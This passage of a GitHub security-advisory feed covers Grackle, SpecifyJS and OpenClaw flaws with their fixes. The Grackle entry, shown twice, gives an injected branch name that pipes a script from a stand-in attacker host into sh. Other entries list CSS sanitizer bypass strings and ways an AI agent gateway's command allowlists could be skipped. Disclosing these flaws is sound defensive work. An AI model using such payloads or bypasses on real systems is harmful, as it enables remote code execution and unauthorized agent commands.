<p><strong>Location:</strong> <code>packages/runtime-sdk/src/worktree.ts:22-28</code> (sink), <code>:135-143</code> (branch → args). Source: <code>packages/powerline/src/grpc-server.ts:112</code> (<code>req.branch</code>), <code>packages/runtime-sdk/src/base-session.ts:60,137</code>.</p>
<p><code>NODE_GIT_EXECUTOR.exec</code> runs:</p>
<pre><code class="language-ts">const shell = process.env.SHELL || true;   // worktree.ts:24 — always truthy
const result = await execRaw("git", args, { ...options, shell });
</code></pre>
<p>When <code>shell</code> is truthy, Node does <strong>not</strong> pass <code>args</code> as a safe argv vector — it concatenates <code>git</code> + args into a single string run through <code>sh -c</code> with <strong>no escaping</strong>. The untrusted <code>branch</code> flows unvalidated from the <code>SpawnSession</code> gRPC request into:</p>
<pre><code class="language-ts">["worktree", "add", "-b", branch, wtPath, startPoint]   // worktree.ts:135-137
["worktree", "add", wtPath, branch]                     // fallback :143
</code></pre>
<p><code>sanitizeBranch()</code> (<code>worktree.ts:50</code>) is applied <strong>only</strong> to compute the on-disk worktree directory path — <em>not</em> to the <code>-b &lt;branch&gt;</code> argument — so it provides zero protection at the injection sink.</p>
<p><strong>Exploit:</strong> set a task branch to <code>x;curl http://attacker/x.sh|sh;#</code> or <code>$(touch /tmp/pwned)</code>. <code>ensureWorktree</code> runs it under <code>sh -c</code>, yielding RCE as the PowerLine user. (Empirically confirmed during the audit: an args-array branch value <code>evilbranch;touch /tmp/PWNED</code> created the file.)</p>
<p>The sibling git path in <code>runtime-utils.ts:48-56</code> already uses <code>execFileAsync("git", [...])</code> with <strong>no</strong> shell, confirming <code>shell:true</code> is unnecessary here.</p>
<h2 id="f13--argument-injection-missing----separator-residual-low">F13 — Argument injection: missing <code>--</code> separator (residual, Low)</h2>
<p><strong>Location:</strong> <code>packages/runtime-sdk/src/worktree.ts:135-143</code>.</p>
<p>Independent of the shell issue, <code>branch</code> is placed as a positional argument with no <code>--</code> terminator. The sibling <code>checkoutBranch</code> (<code>runtime-utils.ts:51</code>) correctly uses <code>["checkout", "--", branch]</code>. Only the fallback invocation (bare trailing positional) is genuinely flag-injectable; <code>git worktree add</code> exposes no dangerous flags reachable this way, so standalone impact is limited — but it should be hardened alongside F1.</p>
<h2 id="remediation">Remediation</h2>
<ol>
<li><strong>Remove <code>shell</code> from <code>NODE_GIT_EXECUTOR</code></strong> — <code>execFile('git', args)</code> with the argv array is already safe and is the pattern used in <code>runtime-utils.ts</code>. This is the primary fix.</li>
<li>Add a <code>--</code> separator before positional refs/paths in both <code>worktree add</code> invocations.</li>
<li><strong>Defense in depth:</strong> validate <code>branch</code> at the gRPC boundary (<code>grpc-server.ts</code>) against git ref rules — reject names beginning with <code>-</code>, containing <code>..</code>, or containing shell metacharacters — before it reaches <code>ensureWorktree</code>.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-vv65-f55v-xm6g">https://github.com/nick-pape/grackle/security/advisories/GHSA-vv65-f55v-xm6g</a></li>
<li><a href="https://github.com/advisories/GHSA-vv65-f55v-xm6g">https://github.com/advisories/GHSA-vv65-f55v-xm6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vv65-f55v-xm6g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:16:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/runtime-sdk] Grackle has command/argument injection in the git worktree executor that enables RCE on provisioned hosts via an unsanitized task branch name (shell:true)]]></title>
        <id>https://github.com/advisories/GHSA-vv65-f55v-xm6g</id>
        <link href="https://github.com/advisories/GHSA-vv65-f55v-xm6g"/>
        <updated>2026-07-02T19:16:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The default git executor used for all worktree operations spawns <code>git</code> through a shell, and the untrusted task <strong>branch</strong> name flows into the command unsanitized. A caller able to reach the PowerLine <code>SpawnSession</code> RPC (a malicious or compromised agent acting through the orchestration layer, or any client able to spawn a task) can achieve <strong>arbitrary command execution</strong> as the PowerLine user on every provisioned environment (SSH host, Docker container, or Codespace), escaping the agent sandbox.</p>
<p>This advisory bundles two related defects in <code>worktree.ts</code> (audit findings <strong>F1</strong> and <strong>F13</strong>).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/runtime-sdk</code> (and reachable via <code>@grackle-ai/powerline</code>) at version <strong>0.132.1</strong> and earlier. All publishable packages are lockstep-versioned.</p>
<h2 id="f1--command-injection-via-shelltrue-primary-high">F1 — Command injection via <code>shell:true</code> (primary, High)</h2>
<p><strong>Location:</strong> <code>packages/runtime-sdk/src/worktree.ts:22-28</code> (sink), <code>:135-143</code> (branch → args). Source: <code>packages/powerline/src/grpc-server.ts:112</code> (<code>req.branch</code>), <code>packages/runtime-sdk/src/base-session.ts:60,137</code>.</p>
<p><code>NODE_GIT_EXECUTOR.exec</code> runs:</p>
<pre><code class="language-ts">const shell = process.env.SHELL || true;   // worktree.ts:24 — always truthy
const result = await execRaw("git", args, { ...options, shell });
</code></pre>
<p>When <code>shell</code> is truthy, Node does <strong>not</strong> pass <code>args</code> as a safe argv vector — it concatenates <code>git</code> + args into a single string run through <code>sh -c</code> with <strong>no escaping</strong>. The untrusted <code>branch</code> flows unvalidated from the <code>SpawnSession</code> gRPC request into:</p>
<pre><code class="language-ts">["worktree", "add", "-b", branch, wtPath, startPoint]   // worktree.ts:135-137
["worktree", "add", wtPath, branch]                     // fallback :143
</code></pre>
<p><code>sanitizeBranch()</code> (<code>worktree.ts:50</code>) is applied <strong>only</strong> to compute the on-disk worktree directory path — <em>not</em> to the <code>-b &lt;branch&gt;</code> argument — so it provides zero protection at the injection sink.</p>
<p><strong>Exploit:</strong> set a task branch to <code>x;curl http://attacker/x.sh|sh;#</code> or <code>$(touch /tmp/pwned)</code>. <code>ensureWorktree</code> runs it under <code>sh -c</code>, yielding RCE as the PowerLine user. (Empirically confirmed during the audit: an args-array branch value <code>evilbranch;touch /tmp/PWNED</code> created the file.)</p>
<p>The sibling git path in <code>runtime-utils.ts:48-56</code> already uses <code>execFileAsync("git", [...])</code> with <strong>no</strong> shell, confirming <code>shell:true</code> is unnecessary here.</p>
<h2 id="f13--argument-injection-missing----separator-residual-low">F13 — Argument injection: missing <code>--</code> separator (residual, Low)</h2>
<p><strong>Location:</strong> <code>packages/runtime-sdk/src/worktree.ts:135-143</code>.</p>
<p>Independent of the shell issue, <code>branch</code> is placed as a positional argument with no <code>--</code> terminator. The sibling <code>checkoutBranch</code> (<code>runtime-utils.ts:51</code>) correctly uses <code>["checkout", "--", branch]</code>. Only the fallback invocation (bare trailing positional) is genuinely flag-injectable; <code>git worktree add</code> exposes no dangerous flags reachable this way, so standalone impact is limited — but it should be hardened alongside F1.</p>
<h2 id="remediation">Remediation</h2>
<ol>
<li><strong>Remove <code>shell</code> from <code>NODE_GIT_EXECUTOR</code></strong> — <code>execFile('git', args)</code> with the argv array is already safe and is the pattern used in <code>runtime-utils.ts</code>. This is the primary fix.</li>
<li>Add a <code>--</code> separator before positional refs/paths in both <code>worktree add</code> invocations.</li>
<li><strong>Defense in depth:</strong> validate <code>branch</code> at the gRPC boundary (<code>grpc-server.ts</code>) against git ref rules — reject names beginning with <code>-</code>, containing <code>..</code>, or containing shell metacharacters — before it reaches <code>ensureWorktree</code>.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-vv65-f55v-xm6g">https://github.com/nick-pape/grackle/security/advisories/GHSA-vv65-f55v-xm6g</a></li>
<li><a href="https://github.com/advisories/GHSA-vv65-f55v-xm6g">https://github.com/advisories/GHSA-vv65-f55v-xm6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vv65-f55v-xm6g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:16:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: CSS expression sanitization is bypassable in renderToString]]></title>
        <id>https://github.com/advisories/GHSA-93q6-wwjh-jc6h</id>
        <link href="https://github.com/advisories/GHSA-93q6-wwjh-jc6h"/>
        <updated>2026-07-02T19:08:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/server/render-to-string.ts:307-311</code></p>
<p>CSS value sanitization stripped <code>expression(</code> and <code>url(javascript:</code> using simple regex, but could be bypassed with CSS unicode escapes (<code>\65xpression(</code>), null bytes, or CSS comments (<code>exp/**/ression(</code>).</p>
<p><strong>Mitigating Factor</strong>: These CSS injection vectors only work in legacy browsers (IE6-IE10). SpecifyJS targets modern browsers.</p>
<h2 id="status">Status</h2>
<p><strong>Fixed in v0.2.136</strong> — CSS sanitization now normalizes unicode escapes and strips CSS comments before pattern matching. Also checks for <code>behavior:</code>, <code>-moz-binding</code>, and <code>-o-link</code> patterns.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-93q6-wwjh-jc6h">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-93q6-wwjh-jc6h</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a">https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a</a></li>
<li><a href="https://github.com/advisories/GHSA-93q6-wwjh-jc6h">https://github.com/advisories/GHSA-93q6-wwjh-jc6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93q6-wwjh-jc6h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T19:08:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: No redirect target validation in secureFetch]]></title>
        <id>https://github.com/advisories/GHSA-j5qp-p44g-2m49</id>
        <link href="https://github.com/advisories/GHSA-j5qp-p44g-2m49"/>
        <updated>2026-07-02T19:08:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/shared/secure-fetch.ts</code></p>
<p><code>assertSecureUrl</code> validated only the initial request URL. The <code>fetch()</code> API follows redirects by default (up to 20 hops). A request to a valid <code>https://</code> URL could redirect to <code>http://internal-service/</code> or other unvalidated destinations.</p>
<h2 id="status">Status</h2>
<p><strong>Fixed in v0.2.136</strong> — <code>secureFetch</code> now defaults to <code>redirect: 'error'</code> which rejects any redirect. Callers can override with <code>{ redirect: 'follow' }</code> if they trust the target.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-j5qp-p44g-2m49">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-j5qp-p44g-2m49</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a">https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a</a></li>
<li><a href="https://github.com/advisories/GHSA-j5qp-p44g-2m49">https://github.com/advisories/GHSA-j5qp-p44g-2m49</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j5qp-p44g-2m49</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T19:08:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: `data:` URI allowed without size restriction]]></title>
        <id>https://github.com/advisories/GHSA-2944-57xv-2682</id>
        <link href="https://github.com/advisories/GHSA-2944-57xv-2682"/>
        <updated>2026-07-02T19:07:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/shared/secure-fetch.ts:33-35</code></p>
<p><code>data:</code> URIs were allowed without any restriction. While <code>data:</code> URIs don't make network requests, they can be used for memory exhaustion via very large data URIs.</p>
<h2 id="status">Status</h2>
<p><strong>Fixed in v0.2.136</strong> — <code>data:</code> URIs are now limited to 1MB. URIs exceeding this limit throw an error.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-2944-57xv-2682">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-2944-57xv-2682</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a">https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a</a></li>
<li><a href="https://github.com/advisories/GHSA-2944-57xv-2682">https://github.com/advisories/GHSA-2944-57xv-2682</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2944-57xv-2682</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T19:07:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: Localhost bypass incomplete (IPv6, 0.0.0.0, 127.x range)]]></title>
        <id>https://github.com/advisories/GHSA-xw57-23p8-9wc5</id>
        <link href="https://github.com/advisories/GHSA-xw57-23p8-9wc5"/>
        <updated>2026-07-02T19:07:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/shared/secure-fetch.ts:52-54</code></p>
<p>The localhost exception allowed <code>localhost</code> and <code>127.0.0.1</code> but did not cover <code>0.0.0.0</code>, <code>[::1]</code> (IPv6 localhost), or the full <code>127.0.0.0/8</code> loopback range.</p>
<h2 id="status">Status</h2>
<p><strong>Fixed in v0.2.136</strong> — Localhost detection now covers <code>localhost</code>, <code>127.0.0.1</code>, <code>[::1]</code>, <code>0.0.0.0</code>, and the full <code>127.x.x.x</code> range.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-xw57-23p8-9wc5">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-xw57-23p8-9wc5</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a">https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/293124c51bf797c0f5cdae32981110545850a893">https://github.com/asymmetric-effort/specifyjs/commit/293124c51bf797c0f5cdae32981110545850a893</a></li>
<li><a href="https://github.com/advisories/GHSA-xw57-23p8-9wc5">https://github.com/advisories/GHSA-xw57-23p8-9wc5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw57-23p8-9wc5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T19:07:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: Production console warnings may leak internal framework state]]></title>
        <id>https://github.com/advisories/GHSA-qcr8-x557-7cp3</id>
        <link href="https://github.com/advisories/GHSA-qcr8-x557-7cp3"/>
        <updated>2026-07-02T19:03:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/core/scheduler.ts:23</code>, <code>core/src/hooks/dispatcher.ts:100</code>, <code>core/src/client/graphql.ts:71</code></p>
<p>Several <code>console.warn</code> calls are not gated behind <code>__DEV__</code> and will fire in production builds, potentially exposing internal framework state such as queue sizes, component names, and query fragments to users viewing the browser console.</p>
<h2 id="status">Status</h2>
<p><strong>Open</strong> — These warnings serve as development-time diagnostics. They do not expose credentials or PII, but may reveal internal architecture details.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Gate all development-time <code>console.warn</code> and <code>console.error</code> calls behind <code>process.env.NODE_ENV !== 'production'</code> or a <code>__DEV__</code> constant that build tools can tree-shake.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-qcr8-x557-7cp3">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-qcr8-x557-7cp3</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/2ef791bc73ead853efd0c227ad8228bc594a7b63">https://github.com/asymmetric-effort/specifyjs/commit/2ef791bc73ead853efd0c227ad8228bc594a7b63</a></li>
<li><a href="https://github.com/advisories/GHSA-qcr8-x557-7cp3">https://github.com/advisories/GHSA-qcr8-x557-7cp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcr8-x557-7cp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T19:03:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: GraphQL gql tag allows metacharacter injection]]></title>
        <id>https://github.com/advisories/GHSA-5c7w-4wm3-85vw</id>
        <link href="https://github.com/advisories/GHSA-5c7w-4wm3-85vw"/>
        <updated>2026-07-02T19:00:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/client/graphql.ts:66-80</code></p>
<p>The <code>gql</code> template tag function warned about interpolated values containing GraphQL metacharacters (<code>{}():</code>) but still concatenated them into the query string, enabling potential GraphQL injection.</p>
<h2 id="status">Status</h2>
<p><strong>Fixed in v0.2.136</strong> — The <code>gql</code> function now throws an error when metacharacters are detected in interpolated values, forcing developers to use the <code>variables</code> parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-5c7w-4wm3-85vw">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-5c7w-4wm3-85vw</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a">https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a</a></li>
<li><a href="https://github.com/advisories/GHSA-5c7w-4wm3-85vw">https://github.com/advisories/GHSA-5c7w-4wm3-85vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5c7w-4wm3-85vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T19:00:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/specifyjs] @asymmetric-effort/specifyjs: URL parse failure silently allows request]]></title>
        <id>https://github.com/advisories/GHSA-8882-frvv-92w4</id>
        <link href="https://github.com/advisories/GHSA-8882-frvv-92w4"/>
        <updated>2026-07-02T18:59:33.000Z</updated>
        <content type="html"><![CDATA[<h2 id="finding">Finding</h2>
<p><strong>Location</strong>: <code>core/src/shared/secure-fetch.ts:42-45</code></p>
<p>When <code>new URL()</code> throws a parse error, the <code>assertSecureUrl</code> function returned without throwing, silently allowing the request to proceed without HTTPS validation.</p>
<h2 id="status">Status</h2>
<p><strong>Fixed in v0.2.136</strong> — The catch block now throws an error instead of silently returning.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-8882-frvv-92w4">https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-8882-frvv-92w4</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a">https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a</a></li>
<li><a href="https://github.com/asymmetric-effort/specifyjs/releases/tag/v0.2.136">https://github.com/asymmetric-effort/specifyjs/releases/tag/v0.2.136</a></li>
<li><a href="https://github.com/advisories/GHSA-8882-frvv-92w4">https://github.com/advisories/GHSA-8882-frvv-92w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8882-frvv-92w4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T18:59:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Native command authorization could skip owner-command enforcement]]></title>
        <id>https://github.com/advisories/GHSA-p73f-w79w-jqr5</id>
        <link href="https://github.com/advisories/GHSA-p73f-w79w-jqr5"/>
        <updated>2026-07-02T17:23:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Native command authorization could skip owner-command enforcement. In affected versions, a sender able to trigger native command handling could authorize a native command without enforcing the configured owner-only command policy.</p>
<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
<h3 id="impact">Impact</h3>
<p>When the affected feature is enabled and reachable, this could run an owner-style command from a sender that should not have that command access. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
<h3 id="patched-versions">Patched Versions</h3>
<p>The first stable patched version is <code>2026.5.6</code>.</p>
<h3 id="mitigations">Mitigations</h3>
<p>keep native command surfaces limited to trusted senders until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-p73f-w79w-jqr5">https://github.com/openclaw/openclaw/security/advisories/GHSA-p73f-w79w-jqr5</a></li>
<li><a href="https://github.com/advisories/GHSA-p73f-w79w-jqr5">https://github.com/advisories/GHSA-p73f-w79w-jqr5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p73f-w79w-jqr5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:23:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: PowerShell encoded-command aliases could miss exec allowlist checks]]></title>
        <id>https://github.com/advisories/GHSA-j472-gf56-x589</id>
        <link href="https://github.com/advisories/GHSA-j472-gf56-x589"/>
        <updated>2026-07-02T17:22:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PowerShell encoded-command aliases could miss exec allowlist checks. In affected versions, a command request using abbreviated encoded-command flags could use an alias form not recognized by the allowlist parser.</p>
<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
<h3 id="impact">Impact</h3>
<p>When the affected feature is enabled and reachable, this could run encoded PowerShell content without the intended allowlist decision. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
<h3 id="patched-versions">Patched Versions</h3>
<p>The first stable patched version is <code>2026.5.12</code>.</p>
<h3 id="mitigations">Mitigations</h3>
<p>Avoid allowlisting PowerShell wrapper forms and require approval for encoded commands until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-j472-gf56-x589">https://github.com/openclaw/openclaw/security/advisories/GHSA-j472-gf56-x589</a></li>
<li><a href="https://github.com/advisories/GHSA-j472-gf56-x589">https://github.com/advisories/GHSA-j472-gf56-x589</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j472-gf56-x589</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:22:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Trusted retry endpoint checks could match hostname prefixes]]></title>
        <id>https://github.com/advisories/GHSA-77q5-rr5v-x43q</id>
        <link href="https://github.com/advisories/GHSA-77q5-rr5v-x43q"/>
        <updated>2026-07-02T17:22:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Trusted retry endpoint checks could match hostname prefixes. In affected versions, a retry endpoint URL chosen by lower-trust input could pass validation by using a hostname prefix that resembled a trusted host.</p>
<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
<h3 id="impact">Impact</h3>
<p>When the affected feature is enabled and reachable, this could send authentication material to an endpoint outside the intended trust target. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
<h3 id="patched-versions">Patched Versions</h3>
<p>The first stable patched version is <code>2026.5.7</code>.</p>
<h3 id="mitigations">Mitigations</h3>
<p>pin retry endpoints to exact trusted origins until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-77q5-rr5v-x43q">https://github.com/openclaw/openclaw/security/advisories/GHSA-77q5-rr5v-x43q</a></li>
<li><a href="https://github.com/advisories/GHSA-77q5-rr5v-x43q">https://github.com/advisories/GHSA-77q5-rr5v-x43q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-77q5-rr5v-x43q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:22:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Telegram interactive callbacks could skip commands.allowFrom]]></title>
        <id>https://github.com/advisories/GHSA-w5ww-7chg-mxcq</id>
        <link href="https://github.com/advisories/GHSA-w5ww-7chg-mxcq"/>
        <updated>2026-07-02T17:18:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Telegram interactive callbacks could skip commands.allowFrom. In affected versions, a Telegram user able to invoke an affected callback could mark the callback as an authorized sender before applying <code>commands.allowFrom</code>.</p>
<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
<h3 id="impact">Impact</h3>
<p>When the affected feature is enabled and reachable, this could trigger command behavior outside the configured Telegram sender allowlist. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
<h3 id="patched-versions">Patched Versions</h3>
<p>The first stable patched version is <code>2026.5.6</code>.</p>
<h3 id="mitigations">Mitigations</h3>
<p>restrict Telegram command callbacks to trusted chats until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-w5ww-7chg-mxcq">https://github.com/openclaw/openclaw/security/advisories/GHSA-w5ww-7chg-mxcq</a></li>
<li><a href="https://github.com/advisories/GHSA-w5ww-7chg-mxcq">https://github.com/advisories/GHSA-w5ww-7chg-mxcq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5ww-7chg-mxcq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:18:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Matrix allowFrom could bind to mutable display names]]></title>
        <id>https://github.com/advisories/GHSA-7hxm-f538-3xp6</id>
        <link href="https://github.com/advisories/GHSA-7hxm-f538-3xp6"/>
        <updated>2026-07-02T17:13:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Matrix allowFrom could bind to mutable display names. In affected versions, a Matrix account able to change display name metadata could match a policy entry through mutable display metadata.</p>
<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
<h3 id="impact">Impact</h3>
<p>When the affected feature is enabled and reachable, this could receive agent access intended for another Matrix identity. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
<h3 id="patched-versions">Patched Versions</h3>
<p>The first stable patched version is <code>2026.5.7</code>.</p>
<h3 id="mitigations">Mitigations</h3>
<p>use stable Matrix user IDs in allowlists until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-7hxm-f538-3xp6">https://github.com/openclaw/openclaw/security/advisories/GHSA-7hxm-f538-3xp6</a></li>
